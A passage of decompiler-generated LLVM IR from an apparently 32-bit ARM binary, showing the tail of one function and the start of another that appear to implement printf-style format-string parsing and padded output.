  %v2_132e4 = inttoptr i32 %v0_132dc to i8*
  %v3_132e4 = call i32 @function_1411c(i8* %v2_132e4, i32 %v5_132e0)
  store i32 %v3_132e4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 %v3_132e4, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_133f8

dec_label_pc_132fc:                               ; preds = %dec_label_pc_132cc, %dec_label_pc_1324c
  %v3_132fc = load i32, i32* %stack_var_-348, align 4
  %v1_13300 = icmp slt i32 %v3_132fc, 0
  br i1 %v1_13300, label %dec_label_pc_13318, label %dec_label_pc_13308

dec_label_pc_13308:                               ; preds = %dec_label_pc_132fc
  %tmp212 = icmp ult i32 %v3_132fc, 6
  br i1 %tmp212, label %dec_label_pc_13320, label %dec_label_pc_13318

dec_label_pc_13318:                               ; preds = %dec_label_pc_13308, %dec_label_pc_132fc
  br label %dec_label_pc_13320

dec_label_pc_13320:                               ; preds = %dec_label_pc_13308, %dec_label_pc_13318
  %storemerge97 = phi i32 [ 6, %dec_label_pc_13318 ], [ 0, %dec_label_pc_13308 ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 0, i32* @r8, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_22c28.706 to i32), i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_133f8

dec_label_pc_13330:                               ; preds = %dec_label_pc_132c4
  store i32 %v2_132cc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_13364, i32* @r4, align 4
  store i32 %v2_132cc, i32* %stack_var_-200, align 4
  br label %dec_label_pc_133f8thread-pre-split

dec_label_pc_13358:                               ; preds = %dec_label_pc_132bc
  br i1 %v7_13358, label %dec_label_pc_13360, label %dec_label_pc_1337c

dec_label_pc_13360:                               ; preds = %dec_label_pc_13358
  %v0_13360 = call i32 @function_12b24()
  store i32 %v0_13360, i32* %r0.global-to-local, align 4
  %v1_13368 = inttoptr i32 %v0_13360 to i32*
  %v2_13368 = load i32, i32* %v1_13368, align 4
  store i32 %v2_13368, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_13370 = call i32 @function_143e0(i32 %v2_13368, i32 %v2_13364, i32 128)
  store i32 %v3_13370, i32* %r0.global-to-local, align 4
  store i32 %v3_13370, i32* @r4, align 4
  br label %dec_label_pc_132d8

dec_label_pc_1337c:                               ; preds = %dec_label_pc_13358
  %v4_13384 = load i32, i32* inttoptr (i32 182112 to i32*), align 32
  %v1_1338c = add i32 %v4_13384, 10
  store i32 %v1_1338c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13390

dec_label_pc_13390:                               ; preds = %dec_label_pc_133d8, %dec_label_pc_1337c
  %v1_133a0 = phi i32 [ %v1_133d8, %dec_label_pc_133d8 ], [ %v4_13384, %dec_label_pc_1337c ]
  %v1_13390 = inttoptr i32 %v1_133a0 to i8*
  %v2_13390 = load i8, i8* %v1_13390, align 1
  %v3_13390 = zext i8 %v2_13390 to i32
  store i32 %v3_13390, i32* %r2.global-to-local, align 4
  %v9_13398 = icmp eq i32 %v3_13390, %tmp99
  br i1 %v9_13398, label %dec_label_pc_133a0, label %dec_label_pc_133d8

dec_label_pc_133a0:                               ; preds = %dec_label_pc_13390
  %v2_133a0 = sub i32 %v1_133a0, %v4_13384
  %v0_133a4 = load i32, i32* @fp, align 4
  store i32 %v0_133a4, i32* %r0.global-to-local, align 4
  store i32 %v2_133ac, i32* %r2.global-to-local, align 4
  %v4_133b4 = mul i32 %v2_133a0, 4
  %v5_133b4 = add i32 %v4_133b4, ptrtoint (i32* @global_var_32b24.708 to i32)
  %v6_133b4 = inttoptr i32 %v5_133b4 to i32*
  %v7_133b4 = load i32, i32* %v6_133b4, align 4
  store i32 %v7_133b4, i32* @ip, align 4
  store i32 78784, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_133b4)
  %v0_133c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_133c0 = icmp slt i32 %v0_133c0, 0
  br i1 %v1_133c0, label %dec_label_pc_13550, label %dec_label_pc_133c8

dec_label_pc_133c8:                               ; preds = %dec_label_pc_133a0
  %v2_133cc = add i32 %v0_133c0, %v1_13428
  br label %dec_label_pc_1353c

dec_label_pc_133d8:                               ; preds = %dec_label_pc_13390
  %v1_133d8 = add i32 %v1_133a0, 1
  %v3_133dc = icmp ult i32 %v1_133d8, %v1_1338c
  br i1 %v3_133dc, label %dec_label_pc_13390, label %dec_label_pc_13550

dec_label_pc_133e8:                               ; preds = %dec_label_pc_1325c
  %v0_133e8 = load i32, i32* @sl, align 4
  store i32 %v0_133e8, i32* @r8, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_133e8, i32* @r4, align 4
  br label %dec_label_pc_133f8

dec_label_pc_133f8thread-pre-split:               ; preds = %.thread85, %dec_label_pc_131ec, %dec_label_pc_132a4, %dec_label_pc_13330
  %v1_133fc.pre = phi i32 [ %v1_133fc.pre205, %dec_label_pc_131ec ], [ %v1_133fc.pre.pre, %dec_label_pc_132a4 ], [ 1, %dec_label_pc_13330 ], [ %v2_1316c, %.thread85 ]
  %v0_133fc.pre = phi i32 [ 0, %dec_label_pc_131ec ], [ %v0_133fc.pre.pre, %dec_label_pc_132a4 ], [ 0, %dec_label_pc_13330 ], [ %v2_131e0, %.thread85 ]
  %stack_var_-336.3.ph = phi i32 [ %v0_13160, %dec_label_pc_131ec ], [ %v0_13090, %dec_label_pc_132a4 ], [ %v0_13090, %dec_label_pc_13330 ], [ %v0_13160, %.thread85 ]
  %v0_133f8.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_133f8

dec_label_pc_133f8:                               ; preds = %dec_label_pc_133f8thread-pre-split, %dec_label_pc_13320, %dec_label_pc_132d8, %dec_label_pc_133e8
  %v1_133fc = phi i32 [ %v1_133fc.pre, %dec_label_pc_133f8thread-pre-split ], [ %storemerge97, %dec_label_pc_13320 ], [ %v3_132e4, %dec_label_pc_132d8 ], [ %v6_13270, %dec_label_pc_133e8 ]
  %v0_133fc = phi i32 [ %v0_133fc.pre, %dec_label_pc_133f8thread-pre-split ], [ 0, %dec_label_pc_13320 ], [ 0, %dec_label_pc_132d8 ], [ %v0_133e8, %dec_label_pc_133e8 ]
  %v0_13404 = phi i32 [ %v0_133f8.pr, %dec_label_pc_133f8thread-pre-split ], [ 11, %dec_label_pc_13320 ], [ 11, %dec_label_pc_132d8 ], [ 11, %dec_label_pc_133e8 ]
  %v0_13444 = phi i32 [ %stack_var_-336.3.ph, %dec_label_pc_133f8thread-pre-split ], [ %v0_13090, %dec_label_pc_13320 ], [ %v0_13090, %dec_label_pc_132d8 ], [ %v0_13090, %dec_label_pc_133e8 ]
  %v7_133f8 = icmp eq i32 %v0_13404, 11
  %v2_133fc = add i32 %v1_133fc, %v0_133fc
  br i1 %v7_133f8, label %dec_label_pc_13414, label %bb173

bb173:                                            ; preds = %dec_label_pc_133f8
  %v7_1340c = icmp sgt i32 %v0_13404, 5
  %. = select i1 %v7_1340c, i32 2, i32 1
  %v2_13410 = add i32 %v2_133fc, %.
  br label %dec_label_pc_13414

dec_label_pc_13414:                               ; preds = %dec_label_pc_133f8, %bb173
  %v0_13428 = phi i32 [ %v2_133fc, %dec_label_pc_133f8 ], [ %v2_13410, %bb173 ]
  store i32 %tmp98, i32* %r2.global-to-local, align 4
  %v3_13418 = icmp uge i32 %tmp98, %v0_13428
  %v9_13418 = icmp eq i32 %tmp98, %v0_13428
  %v2_1341c = xor i1 %v9_13418, true
  %v3_1341c = and i1 %v3_13418, %v2_1341c
  br i1 %v3_1341c, label %bb174, label %bb175

bb174:                                            ; preds = %dec_label_pc_13414
  %v2_13418 = sub i32 %tmp98, %v0_13428
  store i32 %v2_13418, i32* @sl, align 4
  br label %bb175

bb175:                                            ; preds = %dec_label_pc_13414, %bb174
  store i32 %v1_13428, i32* %r2.global-to-local, align 4
  %v2_13424 = xor i1 %v3_13418, true
  %v3_13424 = or i1 %v9_13418, %v2_13424
  br i1 %v3_13424, label %bb176, label %._crit_edge

._crit_edge:                                      ; preds = %bb175
  %v1_1342c.pre = load i32, i32* @sl, align 4
  br label %bb177

bb176:                                            ; preds = %bb175
  store i32 0, i32* @sl, align 4
  br label %bb177

bb177:                                            ; preds = %._crit_edge, %bb176
  %v2_1343c = phi i32 [ %v1_1342c.pre, %._crit_edge ], [ 0, %bb176 ]
  %v2_13428 = add i32 %v0_13428, %v1_13428
  %v2_1342c = add i32 %v2_13428, %v2_1343c
  %v0_13438 = load i32, i32* @sb, align 4
  %v7_13438 = icmp eq i32 %v0_13438, 48
  br i1 %v7_13438, label %bb178, label %.thread30

bb178:                                            ; preds = %bb177
  %v3_1343c = add i32 %v2_1343c, %v0_133fc
  store i32 %v3_1343c, i32* @r8, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread30

.thread30:                                        ; preds = %bb177, %bb178
  %v0_13454 = phi i32 [ %v2_1343c, %bb177 ], [ 0, %bb178 ]
  %v1_13444 = and i32 %v0_13444, 8
  store i32 %v1_13444, i32* @r7, align 4
  %v2_13444 = icmp eq i32 %v1_13444, 0
  br i1 %v2_13444, label %dec_label_pc_1344c, label %dec_label_pc_13468

dec_label_pc_1344c:                               ; preds = %.thread30
  %v0_1344c = load i32, i32* @fp, align 4
  store i32 %v0_1344c, i32* %r0.global-to-local, align 4
  store i32 %v0_13454, i32* %r2.global-to-local, align 4
  %v4_13458 = call i32 @function_12dc8(i32 %v0_1344c, i8 32, i32 %v0_13454)
  store i32 %v4_13458, i32* %r0.global-to-local, align 4
  %v1_1345c = load i32, i32* @sl, align 4
  %v9_1345c = icmp eq i32 %v4_13458, %v1_1345c
  br i1 %v9_1345c, label %dec_label_pc_13464, label %dec_label_pc_13550

dec_label_pc_13464:                               ; preds = %dec_label_pc_1344c
  %v0_13464 = load i32, i32* @r7, align 4
  store i32 %v0_13464, i32* @sl, align 4
  %v0_13470.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13468

dec_label_pc_13468:                               ; preds = %.thread30, %dec_label_pc_13464
  %v0_13470 = phi i32 [ %v0_13404, %.thread30 ], [ %v0_13470.pre, %dec_label_pc_13464 ]
  %v0_1346c = load i32, i32* @fp, align 4
  %v2_13470 = add i32 %v0_13470, ptrtoint (i32* @global_var_22c30.704 to i32)
  store i32 %v2_13470, i32* %r0.global-to-local, align 4
  %v2_13474 = call i32 @function_13de0(i32 %v2_13470, i32 %v0_1346c)
  %v0_13478 = load i32, i32* @fp, align 4
  store i32 %v0_13478, i32* %r0.global-to-local, align 4
  %v0_13480 = load i32, i32* @r8, align 4
  store i32 %v0_13480, i32* %r2.global-to-local, align 4
  %v4_13484 = call i32 @function_12dc8(i32 %v0_13478, i8 48, i32 %v0_13480)
  store i32 %v4_13484, i32* %r0.global-to-local, align 4
  %v1_13488 = load i32, i32* @r8, align 4
  %v9_13488 = icmp eq i32 %v4_13484, %v1_13488
  br i1 %v9_13488, label %dec_label_pc_13490, label %dec_label_pc_13550

dec_label_pc_13490:                               ; preds = %dec_label_pc_13468
  %v3_13490 = load i32, i32* %stack_var_-44, align 4
  %v2_13494 = icmp eq i32 %v3_13490, 0
  br i1 %v2_13494, label %dec_label_pc_1349c, label %dec_label_pc_134c0

dec_label_pc_1349c:                               ; preds = %dec_label_pc_13490
  %v0_1349c = load i32, i32* @r5, align 4
  %v2_1349c = icmp eq i32 %v0_1349c, 0
  br i1 %v2_1349c, label %dec_label_pc_13524, label %dec_label_pc_134a4

dec_label_pc_134a4:                               ; preds = %dec_label_pc_1349c
  %v0_134a4 = load i32, i32* @r4, align 4
  store i32 %v0_134a4, i32* %r0.global-to-local, align 4
  %v0_134ac = load i32, i32* @fp, align 4
  store i32 %v0_134ac, i32* %r2.global-to-local, align 4
  %v4_134b0 = inttoptr i32 %v0_134ac to i16*
  %v5_134b0 = call i32 @function_184e0(i32 %v0_134a4, i32 %v0_1349c, i16* %v4_134b0)
  store i32 %v5_134b0, i32* %r0.global-to-local, align 4
  %v1_134b4 = load i32, i32* @r5, align 4
  %v9_134b4 = icmp eq i32 %v5_134b0, %v1_134b4
  br i1 %v9_134b4, label %dec_label_pc_13524, label %dec_label_pc_13550

dec_label_pc_134c0:                               ; preds = %dec_label_pc_13490
  store i32 %v2_13364, i32* @r6, align 4
  store i32 %v2_13260, i32* @r8, align 4
  store i32 %v2_1326c, i32* @r7, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_13510.pr = load i32, i32* @r5, align 4
  %v2_1351041 = icmp eq i32 %v0_13510.pr, 0
  store i32 %v2_13260, i32* @r1, align 4
  store i32 %v2_13364, i32* @r0, align 4
  br i1 %v2_1351041, label %dec_label_pc_13524, label %dec_label_pc_134d8

dec_label_pc_134d8:                               ; preds = %dec_label_pc_134c0, %dec_label_pc_1350c
  %v1_134dc = phi i32 [ %v2_1350c, %dec_label_pc_1350c ], [ %v0_13510.pr, %dec_label_pc_134c0 ]
  %v2_134d8 = icmp ult i32 %v1_134dc, 128
  %.v1_134dc = select i1 %v2_134d8, i32 %v1_134dc, i32 128
  store i32 %.v1_134dc, i32* %r2.global-to-local, align 4
  %v6_134e4 = call i32 @function_17e4c(i32 %v2_13364, i32 %v2_13260, i32 %.v1_134dc, i32 %v2_1326c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_134e4, i32* @r4, align 4
  %v2_134e8 = icmp eq i32 %v6_134e4, 0
  store i32 %v6_134e4, i32* %r0.global-to-local, align 4
  br i1 %v2_134e8, label %dec_label_pc_1350c, label %dec_label_pc_134f4

dec_label_pc_134f4:                               ; preds = %dec_label_pc_134d8
  store i32 %v2_13364, i32* %r0.global-to-local, align 4
  %v0_134fc = load i32, i32* @fp, align 4
  store i32 %v0_134fc, i32* %r2.global-to-local, align 4
  %v3_13500 = inttoptr i32 %v0_134fc to i16*
  %v4_13500 = call i32 @function_184e0(i32 %v2_13364, i32 %v6_134e4, i16* %v3_13500)
  store i32 %v4_13500, i32* %r0.global-to-local, align 4
  %v1_13504 = load i32, i32* @r4, align 4
  %v9_13504 = icmp eq i32 %v4_13500, %v1_13504
  br i1 %v9_13504, label %dec_label_pc_1350c, label %dec_label_pc_13550

dec_label_pc_1350c:                               ; preds = %dec_label_pc_134f4, %dec_label_pc_134d8
  %v0_1350c = phi i32 [ %v4_13500, %dec_label_pc_134f4 ], [ 0, %dec_label_pc_134d8 ]
  %v1_1350c = load i32, i32* @r5, align 4
  %v2_1350c = sub i32 %v1_1350c, %v0_1350c
  store i32 %v2_1350c, i32* @r5, align 4
  %v2_13510 = icmp eq i32 %v2_1350c, 0
  store i32 %v2_13260, i32* @r1, align 4
  store i32 %v2_13364, i32* @r0, align 4
  br i1 %v2_13510, label %dec_label_pc_13524, label %dec_label_pc_134d8

dec_label_pc_13524:                               ; preds = %dec_label_pc_1350c, %dec_label_pc_134c0, %dec_label_pc_134a4, %dec_label_pc_1349c
  %v0_13524 = load i32, i32* @fp, align 4
  store i32 %v0_13524, i32* %r0.global-to-local, align 4
  %v0_1352c = load i32, i32* @sl, align 4
  store i32 %v0_1352c, i32* %r2.global-to-local, align 4
  %v4_13530 = call i32 @function_12dc8(i32 %v0_13524, i8 32, i32 %v0_1352c)
  store i32 %v4_13530, i32* %r0.global-to-local, align 4
  %v1_13534 = load i32, i32* @sl, align 4
  %v9_13534 = icmp eq i32 %v4_13530, %v1_13534
  br i1 %v9_13534, label %dec_label_pc_1353c, label %dec_label_pc_13550

dec_label_pc_1353c:                               ; preds = %dec_label_pc_13524, %dec_label_pc_133c8, %dec_label_pc_13224, %dec_label_pc_13034
  %stack_var_-336.4 = phi i32 [ %v0_13090, %dec_label_pc_13034 ], [ %v0_13444, %dec_label_pc_13524 ], [ %v0_13090, %dec_label_pc_133c8 ], [ %v0_13090, %dec_label_pc_13224 ]
  %stack_var_-356.3 = phi i32 [ %v1_13428, %dec_label_pc_13034 ], [ %v2_1342c, %dec_label_pc_13524 ], [ %v2_133cc, %dec_label_pc_133c8 ], [ %v2_13228, %dec_label_pc_13224 ]
  %v3_1353c = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_1353c, i32* @r4, align 4
  store i32 %v3_1353c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12f5c.outer

dec_label_pc_13548:                               ; preds = %dec_label_pc_12fb8
  %v1_13548 = add i32 %v0_12fc0, 2
  store i32 %v1_13548, i32* @r4, align 4
  br label %dec_label_pc_12f5c.outer36

dec_label_pc_13550:                               ; preds = %dec_label_pc_133d8, %dec_label_pc_1325c, %dec_label_pc_13524, %dec_label_pc_134a4, %dec_label_pc_13468, %dec_label_pc_1344c, %dec_label_pc_133a0, %dec_label_pc_13284, %dec_label_pc_131fc, %bb142, %dec_label_pc_134f4
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_13558

dec_label_pc_13558:                               ; preds = %dec_label_pc_12fac, %bb, %dec_label_pc_12ef0, %dec_label_pc_13550
  %stack_var_-356.4 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_12ef0 ], [ -1, %dec_label_pc_13550 ], [ %v1_13428, %dec_label_pc_12fac ]
  store i32 %stack_var_-356.4, i32* %r0.global-to-local, align 4
  store i32 %v6_12ea0, i32* @r5, align 4
  store i32 %v9_12ea0, i32* @r6, align 4
  store i32 %v12_12ea0, i32* @r7, align 4
  store i32 %v18_12ea0, i32* @sb, align 4
  store i32 %v21_12ea0, i32* @sl, align 4
  store i32 %v24_12ea0, i32* @fp, align 4
  ret i32 %stack_var_-356.4

; uselistorder directives
  uselistorder i32 %stack_var_-356.4, { 1, 0 }
  uselistorder i32 %v1_13548, { 1, 0 }
  uselistorder i32 %v3_1353c, { 1, 2, 0 }
  uselistorder i32 %v2_1350c, { 1, 2, 0 }
  uselistorder i32 %v0_13454, { 1, 0 }
  uselistorder i32 %v2_1343c, { 2, 0, 1 }
  uselistorder i1 %v9_13418, { 1, 0 }
  uselistorder i32 %v2_133fc, { 1, 0 }
  uselistorder i32 %v0_13444, { 1, 0 }
  uselistorder i32 %v0_133fc, { 1, 0 }
  uselistorder i32 %v1_133d8, { 1, 0 }
  uselistorder i32 %v1_133a0, { 1, 0, 2 }
  uselistorder i32 %v3_13370, { 1, 2, 0 }
  uselistorder i32 %v0_132dc, { 1, 0 }
  uselistorder i32 %v2_132cc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_13294, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1320c, { 1, 0 }
  uselistorder i32 %v2_1316c, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 %v0_13188, { 1, 2, 3, 0 }
  uselistorder i32 %v2_13108, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_13070, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v1_13014.pre, { 1, 0, 2 }
  uselistorder i32 %v1_1300c, { 1, 0 }
  uselistorder i32 %v1_12fb8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_13428, { 0, 8, 1, 7, 2, 3, 6, 5, 4, 9, 10 }
  uselistorder i32 %v2_12f78, { 1, 0 }
  uselistorder i32 %v1_12f70.lcssa, { 1, 0 }
  uselistorder i8 %v2_12f5c, { 1, 0 }
  uselistorder i32 %v2_12f70, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-356.1.ph37, { 1, 0 }
  uselistorder i32 %v5_12f88, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13090, { 6, 4, 3, 15, 14, 5, 0, 1, 13, 12, 11, 7, 10, 8, 2, 9 }
  uselistorder i1 %v7_13180, { 1, 0 }
  uselistorder i1 %v7_130d0, { 1, 2, 0 }
  uselistorder i1 %v7_132bc, { 1, 0 }
  uselistorder i1 %v7_13234, { 1, 0 }
  uselistorder i1 %v7_13110, { 1, 0 }
  uselistorder i32 %v2_1326c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_13260, { 1, 2, 3, 0, 6, 4, 5, 7 }
  uselistorder i32 %v2_13364, { 1, 2, 3, 4, 5, 0, 11, 10, 9, 7, 8, 6 }
  uselistorder i32 %v2_13010, { 1, 3, 2, 0 }
  uselistorder i32 %v4_12fec, { 1, 0 }
  uselistorder i32 %v2_12ea8, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-352, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 %tmp105, { 1, 2, 0 }
  uselistorder i32 %tmp104, { 12, 8, 9, 0, 10, 11, 3, 4, 5, 6, 7, 1, 2, 15, 14, 13 }
  uselistorder i32 %tmp98, { 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 21, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 22, 23, 24, 26, 25, 3, 27, 28, 29, 30, 31, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 6, 8, 7, 11, 9, 10, 13, 12, 14, 16, 15, 1, 17, 18, 19, 20, 4, 21, 5, 22, 23, 47, 24, 46, 25, 45, 26, 28, 27, 3, 29, 30, 32, 33, 42, 31, 34, 35, 2, 40, 44, 36, 43, 37, 38, 41, 39, 0 }
  uselistorder i32 (i32, i8, i32)* @function_12dc8, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_17e4c, { 1, 0 }
  uselistorder i32 77340, { 1, 0 }
  uselistorder label %dec_label_pc_13558, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_13550, { 2, 10, 3, 4, 5, 0, 6, 7, 1, 8, 9 }
  uselistorder label %dec_label_pc_134d8, { 1, 0 }
  uselistorder label %dec_label_pc_13468, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
  uselistorder label %bb175, { 1, 0 }
  uselistorder label %dec_label_pc_13414, { 1, 0 }
  uselistorder label %dec_label_pc_133f8, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_133f8thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_13320, { 1, 0 }
  uselistorder label %dec_label_pc_132d8, { 1, 0 }
  uselistorder label %dec_label_pc_131ec, { 0, 2, 1 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 4, 1, 2, 0, 3 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb160, { 4, 3, 1, 0, 2 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %dec_label_pc_130c0, { 1, 0 }
  uselistorder label %dec_label_pc_130bc, { 2, 1, 0 }
  uselistorder label %bb151, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13008, { 1, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_12fac, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %dec_label_pc_12f78, { 1, 0, 2 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_12f5c.outer36, { 1, 0 }
}

define i32 @function_13588(i32* %arg1) local_unnamed_addr {
dec_label_pc_13588:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_13588 = load i32, i32* @r4, align 4
  %v6_13588 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_13594 = load i32, i32* @r1, align 4
  store i32 %v0_13594, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_135a0 = bitcast i32* %arg1 to i8*
  %v3_135a0 = call i32 @function_13ed0(i8* %v2_135a0, i32 0)
  store i32 %v3_135a0, i32* %r0.global-to-local, align 4
  %v0_135a4 = load i32, i32* @r4, align 4
  %v1_135a4 = add i32 %v0_135a4, 24
  %v2_135a4 = inttoptr i32 %v1_135a4 to i32*
  %v3_135a4 = load i32, i32* %v2_135a4, align 4
  store i32 %v3_135a4, i32* %r3.global-to-local, align 4
  %v0_135a8 = load i32, i32* @r5, align 4
  %v2_135a8 = inttoptr i32 %v0_135a4 to i32*
  store i32 %v0_135a8, i32* %v2_135a8, align 4
  %v0_135ac = load i32, i32* %r3.global-to-local, align 4
  %v1_135ac = add i32 %v0_135ac, -1
  %v1_135b0 = load i32, i32* @r4, align 4
  %v2_135b0 = add i32 %v1_135b0, 24
  %v3_135b0 = inttoptr i32 %v2_135b0 to i32*
  store i32 %v1_135ac, i32* %v3_135b0, align 4
  %v0_135b4 = load i32, i32* @r4, align 4
  %v1_135b4 = add i32 %v0_135b4, 40
  store i32 %v1_135b4, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_135c421 = inttoptr i32 %v1_135b4 to i32*
  store i32 8, i32* %v2_135c421, align 4
  %v3_135c422 = load i32, i32* %r2.global-to-local, align 4
  %v4_135c423 = add i32 %v3_135c422, 4
  store i32 %v4_135c423, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_135c0.dec_label_pc_135c0_crit_edge

dec_label_pc_135c0.dec_label_pc_135c0_crit_edge:  ; preds = %dec_label_pc_13588, %dec_label_pc_135c0.dec_label_pc_135c0_crit_edge
  %v4_135c424 = phi i32 [ %v4_135c423, %dec_label_pc_13588 ], [ %v4_135c4, %dec_label_pc_135c0.dec_label_pc_135c0_crit_edge ]
  %v0_135c0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_135c4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_135c0 = add i32 %v0_135c0.pre, -1
  store i32 %v1_135c0, i32* %r3.global-to-local, align 4
  %v7_135c0 = icmp eq i32 %v0_135c0.pre, 1
  %v2_135c4 = inttoptr i32 %v4_135c424 to i32*
  store i32 %v0_135c4.pre, i32* %v2_135c4, align 4
  %v3_135c4 = load i32, i32* %r2.global-to-local, align 4
  %v4_135c4 = add i32 %v3_135c4, 4
  store i32 %v4_135c4, i32* %r2.global-to-local, align 4
  br i1 %v7_135c0, label %dec_label_pc_135cc, label %dec_label_pc_135c0.dec_label_pc_135c0_crit_edge

dec_label_pc_135cc:                               ; preds = %dec_label_pc_135c0.dec_label_pc_135c0_crit_edge
  %v0_135cc = load i32, i32* @r5, align 4
  store i32 %v0_135cc, i32* %r2.global-to-local, align 4
  %v1_1360c2 = inttoptr i32 %v0_135cc to i8*
  %v2_1360c3 = load i8, i8* %v1_1360c2, align 1
  %v3_1360c4 = zext i8 %v2_1360c3 to i32
  store i32 %v3_1360c4, i32* %r0.global-to-local, align 4
  %v2_136105 = icmp eq i8 %v2_1360c3, 0
  br i1 %v2_136105, label %dec_label_pc_13618, label %dec_label_pc_135d4

dec_label_pc_135d4:                               ; preds = %dec_label_pc_135cc, %dec_label_pc_1360c.backedge
  %v0_135dc = phi i32 [ %storemerge, %dec_label_pc_1360c.backedge ], [ %v0_135cc, %dec_label_pc_135cc ]
  %v0_135d4 = phi i32 [ %v3_1360c, %dec_label_pc_1360c.backedge ], [ %v3_1360c4, %dec_label_pc_135cc ]
  %v7_135d4 = icmp eq i32 %v0_135d4, 37
  br i1 %v7_135d4, label %dec_label_pc_135dc, label %dec_label_pc_13608

dec_label_pc_135dc:                               ; preds = %dec_label_pc_135d4
  %v1_135dc = add i32 %v0_135dc, 1
  %v2_135dc = inttoptr i32 %v1_135dc to i8*
  %v3_135dc = load i8, i8* %v2_135dc, align 1
  %v4_135dc = zext i8 %v3_135dc to i32
  store i32 %v4_135dc, i32* %r3.global-to-local, align 4
  store i32 %v1_135dc, i32* %r2.global-to-local, align 4
  %v7_135e0 = icmp eq i8 %v3_135dc, 37
  br i1 %v7_135e0, label %dec_label_pc_13608, label %dec_label_pc_135e8

dec_label_pc_135e8:                               ; preds = %dec_label_pc_135dc
  %v1_135e8 = load i32, i32* @r4, align 4
  %v2_135e8 = inttoptr i32 %v1_135e8 to i32*
  store i32 %v1_135dc, i32* %v2_135e8, align 4
  %v0_135ec = load i32, i32* @r4, align 4
  store i32 %v0_135ec, i32* %r0.global-to-local, align 4
  %v1_135f0 = inttoptr i32 %v0_135ec to i8*
  %v2_135f0 = call i32 @function_13870(i8* %v1_135f0)
  store i32 %v2_135f0, i32* %r0.global-to-local, align 4
  %v1_135f4 = icmp slt i32 %v2_135f0, 0
  br i1 %v1_135f4, label %dec_label_pc_1361c.loopexit, label %dec_label_pc_13600

dec_label_pc_13600:                               ; preds = %dec_label_pc_135e8
  %v0_13600 = load i32, i32* @r4, align 4
  %v1_13600 = inttoptr i32 %v0_13600 to i32*
  %v2_13600 = load i32, i32* %v1_13600, align 4
  br label %dec_label_pc_1360c.backedge

dec_label_pc_13608:                               ; preds = %dec_label_pc_135d4, %dec_label_pc_135dc
  %v0_13608 = phi i32 [ %v0_135dc, %dec_label_pc_135d4 ], [ %v1_135dc, %dec_label_pc_135dc ]
  %v1_13608 = add i32 %v0_13608, 1
  br label %dec_label_pc_1360c.backedge

dec_label_pc_1360c.backedge:                      ; preds = %dec_label_pc_13608, %dec_label_pc_13600
  %storemerge = phi i32 [ %v1_13608, %dec_label_pc_13608 ], [ %v2_13600, %dec_label_pc_13600 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_1360c = inttoptr i32 %storemerge to i8*
